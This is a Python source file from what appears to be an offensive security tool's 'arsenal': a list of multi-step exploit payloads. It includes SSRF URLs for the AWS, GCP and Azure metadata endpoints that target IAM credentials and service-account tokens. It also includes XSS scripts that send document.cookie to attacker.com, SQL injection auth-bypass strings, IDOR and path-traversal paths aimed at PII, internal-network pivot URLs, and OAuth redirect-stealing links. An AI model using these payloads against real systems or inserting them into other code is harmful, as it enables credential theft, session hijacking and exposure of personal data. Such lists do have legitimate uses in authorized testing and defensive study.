"""
Exploit Chain Arsenal Payloads

Multi-step exploit chain templates: SSRF→metadata, XSS→cookie exfil,
SQLi→auth bypass, IDOR→PII access, and more.
"""
from __future__ import annotations

from typing import List

from oneinfinity.arsenal.context_matcher import Payload

CHAIN_PAYLOADS: List[Payload] = [
    # ── SSRF → Cloud metadata ──────────────────────────────────────────────────
    Payload(
        content="http://169.254.169.254/latest/meta-data/",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "aws-metadata"],
    ),
    Payload(
        content="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "aws-metadata", "iam-credentials"],
    ),
    Payload(
        content="http://169.254.169.254/latest/user-data",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "aws-userdata"],
    ),
    Payload(
        content="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        vuln_type="chain",
        tech_stack=["gcp"],
        complexity="medium",
        tags=["multi-step", "ssrf", "gcp-metadata", "service-account-token"],
    ),
    Payload(
        content="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        vuln_type="chain",
        tech_stack=["azure"],
        complexity="medium",
        tags=["multi-step", "ssrf", "azure-metadata"],
    ),
    Payload(
        content="http://[fd00:ec2::254]/latest/meta-data/",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "aws-metadata", "ipv6"],
    ),
    # ── XSS → Cookie exfiltration ──────────────────────────────────────────────
    Payload(
        content="<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "xss", "cookie-exfil"],
    ),
    Payload(
        content="<script>new Image().src='https://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>",
        vuln_type="chain",
        complexity="simple",
        tags=["multi-step", "xss", "cookie-exfil", "img-beacon"],
    ),
    Payload(
        content="<script>document.location='https://attacker.com/steal?'+document.cookie</script>",
        vuln_type="chain",
        complexity="simple",
        tags=["multi-step", "xss", "cookie-exfil", "redirect"],
    ),
    Payload(
        content=(
            "<script>"
            "var xhr=new XMLHttpRequest();"
            "xhr.open('GET','https://attacker.com/c?'+document.cookie,true);"
            "xhr.send();"
            "</script>"
        ),
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "xss", "cookie-exfil", "xhr"],
    ),
    # ── SQLi → Auth bypass → Admin access ─────────────────────────────────────
    Payload(
        content="' OR '1'='1' -- -",
        vuln_type="chain",
        tech_stack=["mysql", "mssql", "postgres"],
        complexity="simple",
        tags=["multi-step", "sqli", "auth-bypass", "admin-access"],
    ),
    Payload(
        content="admin'--",
        vuln_type="chain",
        tech_stack=["mysql", "mssql"],
        complexity="simple",
        tags=["multi-step", "sqli", "auth-bypass", "admin-access"],
    ),
    Payload(
        content="' OR 1=1 LIMIT 1 -- -",
        vuln_type="chain",
        tech_stack=["mysql"],
        complexity="simple",
        tags=["multi-step", "sqli", "auth-bypass"],
    ),
    Payload(
        content="1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0-- -",
        vuln_type="chain",
        tech_stack=["mysql"],
        complexity="medium",
        tags=["multi-step", "sqli", "auth-bypass", "user-enumeration"],
    ),
    # ── IDOR → PII access chains ───────────────────────────────────────────────
    Payload(
        content="/api/users/1",
        vuln_type="chain",
        complexity="simple",
        tags=["multi-step", "idor", "pii-access", "user-id-manipulation"],
    ),
    Payload(
        content="/api/users/0",
        vuln_type="chain",
        complexity="simple",
        tags=["multi-step", "idor", "pii-access", "user-id-manipulation"],
    ),
    Payload(
        content="/api/profile?user_id=1",
        vuln_type="chain",
        complexity="simple",
        tags=["multi-step", "idor", "pii-access", "query-param"],
    ),
    Payload(
        content="/api/invoices/../../users/1/pii",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "idor", "path-traversal", "pii-access"],
    ),
    Payload(
        content="/api/export?account_id=1&format=csv",
        vuln_type="chain",
        complexity="simple",
        tags=["multi-step", "idor", "pii-exfil", "bulk-export"],
    ),
    # ── SSRF → Internal service pivot ─────────────────────────────────────────
    Payload(
        content="http://localhost:8080/admin",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "internal-pivot", "admin-access"],
    ),
    Payload(
        content="http://10.0.0.1/",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "internal-pivot", "rfc1918"],
    ),
    Payload(
        content="http://192.168.1.1/",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "ssrf", "internal-pivot", "rfc1918"],
    ),
    # ── Open redirect → OAuth token steal ─────────────────────────────────────
    Payload(
        content="/login?next=https://attacker.com/steal",
        vuln_type="chain",
        complexity="medium",
        tags=["multi-step", "open-redirect", "oauth-token-steal"],
    ),
    Payload(
        content="/oauth/callback?redirect_uri=https://attacker.com",
        vuln_type="chain",
        complexity="complex",
        tags=["multi-step", "oauth", "redirect-uri-manipulation", "token-steal"],
    ),
]
